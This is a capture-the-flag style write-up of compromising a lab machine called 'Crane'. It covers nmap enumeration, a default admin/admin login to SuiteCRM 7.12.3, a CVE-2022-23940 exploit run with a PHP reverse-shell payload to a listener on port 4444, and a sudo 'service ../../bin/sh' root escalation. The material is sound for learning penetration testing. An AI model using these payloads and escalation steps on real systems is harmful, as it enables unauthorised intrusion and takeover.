##### Tags: `sudo-l`  `GTFObins`  `github`  `default credential` `service`

# 🐧Crane🐧
## Enumeration
Nmap
```console
$ nmap -sC -sV 192.168.196.146
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 20:32 AEDT
Nmap scan report for 192.168.196.146
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
tried mysql server but unable to login
```console
$ mysql -u root -proot -h 192.168.196.146 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.201' is not allowed to connect to this MySQL server
```
check the port 80 webpage  
use default credential admin admin logged in  
Running SuiteCRM Version 7.12.3   
search and found the exploit in github  

https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file
Follow the instruction 
```console
$ python3 exploit.py -h http://192.168.196.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.201\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.196.146] 51774
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege escalation
run sudo -l and found i can run root with service command and no password
```console
www-data@crane:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```
Search GTOFbins and found the command to exploit  
https://gtfobins.org/gtfobins/service/#shell  
```console
service ../../bin/sh
```
```console
www-data@crane:/tmp$ sudo /usr/sbin/service ../../bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
